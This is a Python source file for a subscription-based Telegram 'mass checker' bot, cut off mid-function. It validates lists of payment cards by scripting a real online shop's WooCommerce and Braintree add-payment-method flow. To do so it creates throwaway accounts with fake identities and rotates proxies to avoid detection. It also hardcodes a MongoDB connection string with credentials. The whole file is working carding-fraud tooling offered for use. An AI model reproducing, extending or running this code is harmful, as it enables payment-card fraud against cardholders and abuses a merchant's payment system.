import requests
import re
import base64
import random
import string
import time
import asyncio
import aiohttp
import io
import pycountry
import nest_asyncio
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler
from telegram.ext import filters
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from bs4 import BeautifulSoup
from pymongo import MongoClient
from datetime import datetime, timedelta
import logging

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Apply nest_asyncio to allow nested event loops
nest_asyncio.apply()

# Configuration
BATCH_DELAY = 30  # Seconds to wait between batches
CHUNK_SIZE = 5    # Number of cards to check concurrently
USE_PROXIES = True  # Set to False to bypass proxies for faster single checks
MONGO_URL = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  # Replace with your MongoDB URL
OWNER_ID = 7593550190  # Replace with your Telegram user ID
COOLDOWN_MINUTES = 5  # Cooldown period after a check

# MongoDB setup
try:
    client = MongoClient(MONGO_URL)
    db = client['fn_checker']
    keys_collection = db['keys']
    users_collection = db['users']
    logger.info("Connected to MongoDB")
except Exception as e:
    logger.error(f"Failed to connect to MongoDB: {str(e)}")
    raise SystemExit("MongoDB connection failed")

# User data for in-memory session tracking
user_data = {}

# Semaphore to limit concurrent checks globally
GLOBAL_SEMAPHORE = asyncio.Semaphore(10)

# Load proxies from proxies.txt
def load_proxies():
    try:
        with open('proxiess.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(proxies)} proxies from proxies.txt")
            return proxies
    except FileNotFoundError:
        logger.warning("proxies.txt not found, running without proxies.")
        return []

proxies = load_proxies() if USE_PROXIES else []

# Utility functions for generating random data
def generate_full_name():
    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
    return random.choice(first), random.choice(last)

def generate_address():
    cities = ["London", "Manchester"]
    streets = ["Baker St", "Oxford St"]
    zips = ["SW1A 1AA", "M1 1AE"]
    city = random.choice(cities)
    return city, "England", f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_phone():
    return "303" + ''.join(random.choices(string.digits, k=7))

def generate_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_flag(country_code):
    try:
        if len(country_code) == 3:
            country = pycountry.countries.get(alpha_3=country_code)
        else:
            country = pycountry.countries.get(alpha_2=country_code)
        if country:
            flag = ''.join(chr(ord(c) + 127397) for c in country.alpha_2.upper())
            return f"{country.name} {flag}"
        return country_code
    except:
        return "Unknown"

# Generate key in format FN-B3-XXX-XXX
def generate_key():
    chars = string.ascii_uppercase + string.digits
    part1 = ''.join(random.choices(chars, k=3))
    part2 = ''.join(random.choices(chars, k=3))
    return f"FN-B3-{part1}-{part2}"

# Check user subscription and tier limits
def get_user_subscription(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user and user.get("expiry") > datetime.utcnow():
        return user
    return None

# Async function to check a credit card using Braintree API with timing logs
async def check_cc(cc, mes, ano, cvv, proxy=None):
    start_time = time.time()
    full = f"{cc}|{mes}|{ano}|{cvv}"
    logger.debug(f"Starting check for card {full} with proxy {proxy}")
    
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_email()
    username = generate_username()
    num = generate_phone()

    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
    
    async with GLOBAL_SEMAPHORE:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:  # Reduced timeout to 15s
            proxy_url = proxy if proxy and USE_PROXIES else None
            proxy_status = "None" if not proxy_url else None
            logger.info(f"Using proxy: {proxy_url if proxy_url else 'None'}")
            try:
                # Step 1: Get my-account page
                start = time.time()
                async with session.get('https://www.bebebrands.com/my-account/', headers=headers, proxy=proxy_url) as r:
                    if r.status != 200:
                        proxy_status = "𝗗𝗲𝗮𝗱 ❌"
                        raise Exception(f"Failed to access my-account: {r.status}")
                    proxy_status = "𝗟𝗶𝘃𝗲 🟢"
                    text = await r.text()
                    reg_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text)
                    if not reg_match:
                        raise Exception("Could not find register nonce")
                    reg = reg_match.group(1)
                logger.info(f"GET my-account took {time.time() - start:.2f} seconds")

                # Step 2: Register account
                start = time.time()
                async with session.post('https://www.bebebrands.com/my-account/', headers=headers, data={
                    'username': username, 'email': acc, 'password': 'SandeshThePapa@',
                    'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
                }, proxy=proxy_url) as r:
                    if r.status != 200:
                        raise Exception(f"Failed to register account: {r.status}")
                logger.info(f"POST register account took {time.time() - start:.2f} seconds")

                # Skip Steps 3 and 4 (billing address) to test if they're necessary
                """
                # Step 3: Get billing address page
                start = time.time()
                async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxy_url) as r:
                    if r.status != 200:
                        raise Exception(f"Failed to access billing address page: {r.status}")
                    text = await r.text()
                    address_nonce_match = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text)
                    if not address_nonce_match:
                        raise Exception("Could not find address nonce")
                    address_nonce = address_nonce_match.group(1)
                logger.info(f"GET billing address page took {time.time() - start:.2f} seconds")

                # Step 4: Save billing address
                start = time.time()
                async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data={
                    'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
                    'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
                    'billing_phone': num, 'billing_email': acc, 'save_address': 'Save address',
                    'woocommerce-edit-address-nonce': address_nonce,
                    '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
                }, proxy=proxy_url) as r:
                    if r.status != 200:
                        raise Exception(f"Failed to save billing address: {r.status}")
                logger.info(f"POST save billing address took {time.time() - start:.2f} seconds")
                """

                # Step 5: Get add-payment-method page
                start = time.time()
                async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxy_url) as r:
                    if r.status != 200:
                        raise Exception(f"Failed to access add-payment-method: {r.status}")
                    text = await r.text()
                    add_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text)
                    client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', text)
                    if not add_nonce_match or not client_nonce_match:
                        raise Exception("Could not find payment method nonce or client nonce")
                    add_nonce = add_nonce_match.group(1)
                    client_nonce = client_nonce_match.group(1)
                logger.info(f"GET add-payment-method took {time.time() - start:.2f} seconds")

                # Step 6: Get client token
                start = time.time()
                async with session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data={
                    'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
                }, proxy=proxy_url) as token_resp:
                    if token_resp.status != 200:
                        raise Exception(f"Failed to get client token: {token_resp.status}")
                    enc = (await token_resp.json())['data']
                    dec = base64.b64decode(enc).decode('utf-8')
                    au_match = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                    if not au_match:
                        raise Exception("Could not find authorization fingerprint")
                    au = au_match.group(1)
                logger.info(f"POST get client token took {time.time() - start:.2f} seconds")

                # Step 7: Tokenize credit card
                start = time.time()
                tokenize_headers = {
                    'authorization': f'Bearer {au}', 'braintree-version': '2018-05-10', 'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com', 'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': headers['user-agent']
                }
                json_data = {
                    'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code(36)},
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                    'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv}, 'options': {'validate': False}}},
                    'operationName': 'TokenizeCreditCard'
                }
                async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxy_url) as r:
                    if r.status != 200:
                        raise Exception(f"Failed to tokenize card: {r.status}")
                    response_json = await r.json()
                    if 'errors' in response_json:
                        return {'status': 'declined', 'message': 'Invalid card details', 'time_taken': time.time() - start_time, 'proxy_status': proxy_status}
                    tok = response_json['data']['tokenizeCreditCard']['token']
                    credit_card = response_json['data']['tokenizeCreditCard']['creditCard']
                    bin_data = credit_card['binData']
                    card_info = {
                        'brand': credit_card['brandCode'].capitalize(),
                        'type': 'debit' if bin_data['debit'] == 'Yes' else 'credit',
                        'bin': credit_card['bin'],
                        'last4': credit_card['last4']
                    }
                    issuer = bin_data['issuingBank']
                    country = get_flag(bin_data['countryOfIssuance'])
                logger.info(f"POST tokenize card took {time.time() - start:.2f} seconds")

                # Step 8: Add payment method
                start = time.time()
                data = [
                    ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
                    ('wc-braintree-credit-card-3d-secure-enabled', ''), ('wc-braintree-credit-card-3d-secure-verified', ''),
                    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'), ('wc_braintree_credit_card_payment_nonce', tok),
                    ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                    ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('wc_braintree_paypal_payment_nonce', ''),
                    ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                    ('wc_braintree_paypal_context', 'shortcode'), ('wc_braintree_paypal_amount', '0.00'),
                    ('wc_braintree_paypal_currency', 'GBP'), ('wc_braintree_paypal_locale', 'en_gb'),
                    ('wc_braintree_paypal-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
                    ('_wp_http_referer', '/my-account/add-payment-method/'), ('woocommerce_add_payment_method', '1')
                ]
                async with session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxy_url) as response:
                    if response.status != 200:
                        raise Exception(f"Failed to submit payment method: {response.status}")
                    text = await response.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    error_message = soup.select_one('.woocommerce-error .message-container')
                    if error_message:
                        msg = error_message.text.strip()
                    else:
                        msg = 'Unknown error'
                    if any(x in text for x in ['Nice! New payment method added', 'Insufficient funds', 'Payment method successfully added.', 'Nice', 'Duplicate card exists in the vault.']):
                        logger.debug(f"Card {full} approved")
                        return {
                            'status': 'approved', 'message': 'APPROVED ✅', 'card_info': card_info,
                            'issuer': issuer, 'country': country, 'time_taken': time.time() - start_time,
                            'proxy_status': proxy_status
                        }
                    elif 'Card Issuer Declined CVV' in text:
                        logger.debug(f"Card {full} CCN")
                        return {
                            'status': 'ccn', 'message': 'Card Issuer Declined CVV', 'card_info': card_info,
                            'issuer': issuer, 'country': country, 'time_taken': time.time() - start_time,
                            'proxy_status': proxy_status
                        }
                    else:
                        logger.debug(f"Card {full} declined: {msg}")
                        return {
                            'status': 'declined', 'message': msg, 'card_info': card_info,
                            'issuer': issuer, 'country': country, 'time_taken': time.time() - start_time,
                            'proxy_status': proxy_status
                        }
                logger.info(f"POST add payment method took {time.time() - start:.2f} seconds")
            except Exception as e:
                logger.error(f"Error checking card {full} at step: {str(e)}")
                proxy_status = proxy_status or ("𝗗𝗲𝗮𝗱 ❌" if proxy_url else "None")
                return {'status': 'declined', 'message': str(e), 'time_taken': time.time() - start_time, 'proxy_status': proxy_status}

# Async format response messages
async def format_approved_message(result, card, user_id, bot, proxy_status):
    try:
        user = await bot.get_chat(user_id)
        checked_by = f'<a href="tg://user?id={user_id}">{user.first_name}</a>'
    except:
        checked_by = f"User ID {user_id}"
    card_info = f"{result['card_info']['brand']} - {result['card_info']['type']}"
    subscription = get_user_subscription(user_id)
    tier = subscription['tier'] if subscription else "None"
    return f"""
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

[ϟ]𝗖𝗮𝗿𝗱 -» <code>{card}</code>
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}

[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {result['issuer']} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {result['country']}

[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}
[み]𝗕𝗼𝘁 -» <a href="tg://user?id=8009942983">𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃 </a>
"""

async def format_ccn_message(result, card, user_id, bot, proxy_status):
    try:
        user = await bot.get_chat(user_id)
        checked_by = f'<a href="tg://user?id={user_id}">{user.first_name}</a>'
    except:
        checked_by = f"User ID {user_id}"
    card_info = f"{result['card_info']['brand']} - {result['card_info']['type']}"
    subscription = get_user_subscription(user_id)
    tier = subscription['tier'] if subscription else "None"
    return f"""
𝐂𝐂𝐍 ✅

[ϟ]𝗖𝗮𝗿𝗱 -» <code>{card}</code>
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result['message']}

[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {result['issuer']} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {result['country']}

[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}
[み]𝗕𝗼𝘁 -» <a href="tg://user?id=8009942983">𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃 </a>
"""

async def format_declined_message(result, card, user_id, bot, proxy_status):
    try:
        user = await bot.get_chat(user_id)
        checked_by = f'<a href="tg://user?id={user_id}">{user.first_name}</a>'
    except:
        checked_by = f"User ID {user_id}"
    card_info = f"{result['card_info']['brand']} - {result['card_info']['type']}" if 'card_info' in result else "Unknown"
    country = result['country'] if 'country' in result else "Unknown"
    issuer = result['issuer'] if 'issuer' in result else "Unknown"
    subscription = get_user_subscription(user_id)
    tier = subscription['tier'] if subscription else "None"
    return f"""
𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌

[ϟ]𝗖𝗮𝗿𝗱 -» <code>{card}</code>
[ϟ]G𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}

[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}

[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}
[み]𝗕𝗼𝘁 -» <a href="tg://user?id=8009942983">𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃 </a>
"""

def generate_progress_message(approved, declined, checked, total, start_time):
    duration = time.time() - start_time
    avg_speed = checked / duration if duration > 0 else 0
    success_rate = (approved / checked * 100) if checked > 0 else 0
    return f"""
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}
[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱: {declined}
[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {checked}/{total}
[✪] 𝐓𝐨𝐭𝐚𝐥: {total}
[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝗼𝗻: {duration:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝘁𝗲: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: <a href="tg://user?id=7593550190">𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥✘ </a>
━━━━━━━━━━━━━━━━━━━━━━
"""

# Telegram command handlers
async def start(update: Update, context):
    user_id = update.message.from_user.id
    chat_type = update.message.chat.type
    keyboard = [
        [InlineKeyboardButton("Upload Combo", callback_data='upload_combo')],
        [InlineKeyboardButton("Live Stats", callback_data='live_stats')],
        [InlineKeyboardButton("Help", callback_data='help')],
        [InlineKeyboardButton("Cancel Check", callback_data='cancel_check')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = (
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
        "🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n"
        "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐳𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰\n"
        "🔑 𝐔𝐬𝐞 /redeem {key} 𝐓𝐨 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧"
    )
    if chat_type == 'private':
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    else:  # group or supergroup
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML', reply_to_message_id=update.message.message_id)
    logger.info(f"User {user_id} used /start in chat type {chat_type}")

async def genkey(update: Update, context):
    user_id = update.message.from_user.id
    chat_type = update.message.chat.type
    if user_id != OWNER_ID:
        message = "You are not authorized to generate keys."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        return
    try:
        args = context.args
        if len(args) != 2 or args[0] not in ['Gold', 'Platinum', 'Owner'] or args[1] not in ['1d', '7d', '30d']:
            message = "Usage: /genkey {Gold, Platinum, Owner} {1d, 7d, 30d}"
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
            return
        tier = args[0]
        duration_str = args[1]
        duration_days = {'1d': 1, '7d': 7, '30d': 30}[duration_str]
        key = generate_key()
        keys_collection.insert_one({
            "key": key,
            "tier": tier,
            "duration": duration_days,
            "created_at": datetime.utcnow(),
            "redeemed": False,
            "redeemed_by": None,
            "redeemed_at": None
        })
        message = f"""
𝐆𝐢𝐟𝐭𝐜𝗼𝗱𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅
𝐀𝐦𝐨𝐮𝗻𝘁: 1

➔ {key}
𝐕𝐚𝐥𝐮𝐞: {tier} {duration_days} days

𝐅𝐨𝐫 𝐑𝐞𝗱𝐞𝐞𝗺𝘁𝗶𝗼𝗻
𝐓𝐲𝗽𝐞 /redeem {key}
"""
        if chat_type == 'private':
            await update.message.reply_text(message, parse_mode='HTML')
        else:
            await update.message.reply_text(message, parse_mode='HTML', reply_to_message_id=update.message.message_id)
        logger.info(f"Generated key {key} by owner {user_id}: {tier}, {duration_days} days")
    except Exception as e:
        logger.error(f"Error in /genkey for user {user_id}: {str(e)}")
        message = "Error generating key."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)

async def redeem(update: Update, context):
    user_id = update.message.from_user.id
    chat_type = update.message.chat.type
    try:
        args = context.args
        if not args or len(args) != 1:
            message = "Usage: /redeem {key}"
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
            return
        key = args[0].strip()
        key_doc = keys_collection.find_one({"key": key, "redeemed": False})
        if not key_doc:
            message = "Invalid or already redeemed key."
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
            return
        tier = key_doc['tier']
        duration_days = key_doc['duration']
        expiry = datetime.utcnow() + timedelta(days=duration_days)
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"tier": tier, "expiry": expiry, "last_check_completed": None}},
            upsert=True
        )
        keys_collection.update_one(
            {"key": key},
            {"$set": {"redeemed": True, "redeemed_by": user_id, "redeemed_at": datetime.utcnow()}}
        )
        message = f"""
𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 🎉

𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐍𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅

𝐕𝐚𝐥𝐮𝐞: {tier} {duration_days} days

𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮
"""
        if chat_type == 'private':
            await update.message.reply_text(message, parse_mode='HTML')
        else:
            await update.message.reply_text(message, parse_mode='HTML', reply_to_message_id=update.message.message_id)
        logger.info(f"User {user_id} redeemed key {key}: {tier}, {duration_days} days")
    except Exception as e:
        logger.error(f"Error in /redeem for user {user_id}: {str(e)}")
        message = "Error redeeming key."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)

async def stop(update: Update, context):
    user_id = update.message.from_user.id
    chat_type = update.message.chat.type
    try:
        if user_id in user_data and user_data[user_id].get('checking', False):
            user_data[user_id]['stop'] = True
            message = "Check canceled."
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        else:
            message = "No ongoing check to cancel."
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
    except Exception as e:
        logger.error(f"Error in /stop for user {user_id}: {str(e)}")
        message = "Error processing stop command."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)

async def stats(update: Update, context):
    user_id = update.message.from_user.id
    chat_type = update.message.chat.type
    try:
        if user_id in user_data and user_data[user_id].get('checking', False):
            progress = generate_progress_message(
                user_data[user_id]['approved'],
                user_data[user_id]['checked'] - user_data[user_id]['approved'],
                user_data[user_id]['checked'],
                len(user_data[user_id]['cards']),
                user_data[user_id]['start_time']
            )
            if chat_type == 'private':
                await update.message.reply_text(progress, parse_mode='HTML')
            else:
                await update.message.reply_text(progress, parse_mode='HTML', reply_to_message_id=update.message.message_id)
        else:
            message = "No ongoing check."
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
    except Exception as e:
        logger.error(f"Error in /stats for user {user_id}: {str(e)}")
        message = "Error retrieving stats."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)

async def chk(update: Update, context):
    user_id = update.message.from_user.id
    chat_id = update.message.chat.id
    chat_type = update.message.chat.type
    subscription = get_user_subscription(user_id)
    if not subscription:
        message = "You need an active subscription. Use /redeem {key} to activate."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        return
    text = update.message.text.split(' ', 1)
    if len(text) < 2:
        message = "Please use: /chk cc|mm|yy|cvv"
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        return
    card = text[1].strip()
    try:
        status_message = await update.message.reply_text("🔍 Checking Card...", reply_to_message_id=update.message.message_id if chat_type != 'private' else None)
        cc, mes, ano, cvv = card.split('|')
        if len(mes) == 1:
            mes = f'0{mes}'
        if len(ano) == 2:
            ano = f'20{ano}'
        proxy = random.choice(proxies) if proxies and USE_PROXIES else None
        result = await check_cc(cc, mes, ano, cvv, proxy)
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=status_message.message_id)
        except Exception as e:
            logger.warning(f"Failed to delete status message for user {user_id} in chat {chat_id}: {str(e)}")
        proxy_status = result.get('proxy_status', 'None')
        if result['status'] == 'approved':
            message = await format_approved_message(result, card, user_id, context.bot, proxy_status)
        elif result['status'] == 'ccn':
            message = await format_ccn_message(result, card, user_id, context.bot, proxy_status)
        else:
            message = await format_declined_message(result, card, user_id, context.bot, proxy_status)
        if chat_type == 'private':
            await update.message.reply_text(message, parse_mode='HTML')
        else:
            await update.message.reply_text(message, parse_mode='HTML', reply_to_message_id=update.message.message_id)
    except Exception as e:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=status_message.message_id)
        except:
            pass
        logger.error(f"Error in /chk for card {card} by user {user_id}: {str(e)}")
        message = "Invalid format. Use: /chk cc|mm|yy|cvv"
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)

async def handle_file(update: Update, context):
    user_id = update.message.from_user.id
    chat_id = update.message.chat.id
    chat_type = update.message.chat.type
    subscription = get_user_subscription(user_id)
    if not subscription:
        message = "You need an active subscription. Use /redeem {key} to activate."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        return
    tier = subscription['tier']
    max_cards = {'Gold': 500, 'Platinum': 1000, 'Owner': 4000}[tier]
    
    # Check if a check is in progress
    if user_id in user_data and user_data[user_id].get('checking', False):
        message = "Session In Progress Please First /stop that to check Again"
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        return
    
    # Check cooldown
    last_check = subscription.get('last_check_completed')
    if last_check and datetime.utcnow() < last_check + timedelta(minutes=COOLDOWN_MINUTES):
        remaining = (last_check + timedelta(minutes=COOLDOWN_MINUTES) - datetime.utcnow()).total_seconds()
        message = f"Please Wait {COOLDOWN_MINUTES}min Before Checking"
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        message = "Please send a .txt file with cards in format: cc|mm|yy|cvv"
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
        return
    try:
        file = await context.bot.get_file(document.file_id)
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
            async with session.get(file.file_path) as response:
                if response.status != 200:
                    raise Exception(f"Failed to download file: {response.status}")
                content = await response.text()
        cards = [line.strip() for line in content.splitlines() if line.strip()]
        if not cards:
            message = "File is empty or invalid."
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
            return
        if len(cards) > max_cards:
            message = f"Your {tier} subscription allows checking up to {max_cards} cards at a time."
            if chat_type == 'private':
                await update.message.reply_text(message)
            else:
                await update.message.reply_text(message, reply_to_message_id=update.message.message_id)
            return
        user_data[user_id] = {'checking': True, 'stop': False, 'chat_id': chat_id, 'chat_type': chat_type}
        msg = await context.bot.send_message(
            chat_id,
            "✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝! 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n"
            "⚡ 𝐒𝐩𝐞𝐞𝐝: 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐖𝐡𝐞𝐧 𝐁𝐨𝐭 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 50 𝐂𝐚𝐫𝐝𝐬/sec\n"
            "📈 𝐔𝐬𝐞 /stats 𝐅𝐨𝐫 𝐋𝐢𝐯𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐬",
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id if chat_type != 'private' else None
        )
        user_data[user_id]['progress_message_id'] = msg.message_id
        asyncio.create_task(check_multiple_cards(context.bot, user_id, cards))
